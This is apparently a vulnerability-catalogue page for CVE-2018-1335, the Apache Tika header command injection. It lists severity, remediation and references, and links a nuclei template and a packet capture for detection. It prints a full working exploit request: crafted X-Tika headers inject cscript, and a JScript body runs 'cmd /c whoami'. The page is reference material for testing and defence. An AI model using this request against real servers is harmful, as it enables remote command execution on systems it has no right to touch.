---
layout: "post"
cve_id: "CVE-2018-1335"
title: "Apache Tika < 1.1.8 - Header Command Injection"
pcap: true
pcap_path: "/pcaps/2018/CVE-2018-1335.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-1335.yaml"
author: "pikpikcu"
severity: "high"
impact: "Successful exploitation of this vulnerability allows remote attackers to execute arbitrary commands on the affected server.
"
remediation: "Upgrade to Tika 1.18."
reference:
  - "https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/"
  - "https://www.exploit-db.com/exploits/47208"
  - "https://lists.apache.org/thread.html/b3ed4432380af767effd4c6f27665cc7b2686acccbefeb9f55851dca@%3Cdev.tika.apache.org%3E"
  - "https://nvd.nist.gov/vuln/detail/CVE-2018-1335"
  - "http://packetstormsecurity.com/files/153864/Apache-Tika-1.17-Header-Command-Injection.html"
classification: "{'cvss-metrics': 'CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 8.1, 'cve-id': 'CVE-2018-1335', 'epss-score': 0.93516, 'epss-percentile': 0.99814, 'cpe': 'cpe:2.3:a:apache:tika:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'apache', 'product': 'tika'}"
tags:
  - "cve"
  - "cve2018"
  - "packetstorm"
  - "edb"
  - "apache"
  - "tika"
  - "rce"
  - "intrusive"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
Apache Tika versions 1.7 to 1.17 allow clients to send carefully crafted headers to tika-server that could be used to inject commands into the command line of the server running tika-server. This vulnerability only affects those running tika-server on a server that is open to untrusted clients.

## ðŸŒ HTTP Request
```nohighlight
PUT /meta HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Content-Length: 92
Accept: */*
Accept-Language: en
Connection: close
Content-type: image/jp2
Expect: 100-continue
X-Tika-OCRLanguage: //E:Jscript
X-Tika-OCRTesseractPath: cscript
Accept-Encoding: gzip

var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec("cmd /c whoami");
```

